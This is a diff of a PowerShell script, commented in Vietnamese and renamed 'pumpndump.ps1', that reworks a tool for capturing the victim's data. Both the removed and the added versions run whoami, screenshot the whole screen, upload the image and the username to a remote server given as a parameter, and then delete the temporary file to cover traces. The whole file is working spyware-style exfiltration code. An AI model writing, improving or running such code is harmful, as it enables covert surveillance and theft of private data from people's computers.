@@ -1,40 +1,35 @@
-# Đường dẫn lưu ảnh chụp màn hình
-$tempScreenshot = "$env:TEMP\screenshot.png"
+# PowerShell Script: pumpndump.ps1
+param (
+    [string]$hq
+)
 
-# Lấy tên máy
+# Lấy tên người dùng hiện tại
 $name = whoami
 
-# Chụp ảnh màn hình
+# Chụp màn hình và lưu tạm thời
+$screenshotPath = "$env:temp\screenshot.png"
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-$bitmap.Save($tempScreenshot, [System.Drawing.Imaging.ImageFormat]::Png)
+$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bmp = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+$graphics = [Drawing.Graphics]::FromImage($bmp)
+$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bmp.Size)
+$bmp.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
 
-# Kiểm tra biến $ServerUrl
-if (-not $ServerUrl) {
-    Write-Host "Server URL is not defined. Exiting."
-    exit
-}
+# Gửi dữ liệu tới server
+$uri = "$hq/upload"
+$client = New-Object System.Net.WebClient
+$client.Headers.Add("Content-Type", "multipart/form-data")
+$fileContent = Get-Content -Path $screenshotPath -Encoding Byte
+$client.UploadData($uri, $fileContent)
 
-# Gửi tên máy
-try {
-    $webClient = New-Object System.Net.WebClient
-    $webClient.UploadString("$ServerUrl/name", $name)
-} catch {
-    Write-Host "Error uploading name: $_"
-}
+# Gửi tên người dùng
+$client.Headers.Clear()
+$client.Headers.Add("Content-Type", "application/json")
+$data = @{ name = $name }
+$jsonData = $data | ConvertTo-Json
+$client.UploadString("$hq/data", "POST", $jsonData)
 
-# Gửi ảnh chụp màn hình
-try {
-    $fileBytes = [System.IO.File]::ReadAllBytes($tempScreenshot)
-    $webClient.UploadData("$ServerUrl/screenshot", $fileBytes)
-} catch {
-    Write-Host "Error uploading screenshot: $_"
-}
-
-# Xoá ảnh chụp màn hình
-Remove-Item $tempScreenshot -ErrorAction SilentlyContinue
+# Xoá file tạm
+Remove-Item $screenshotPath -Force
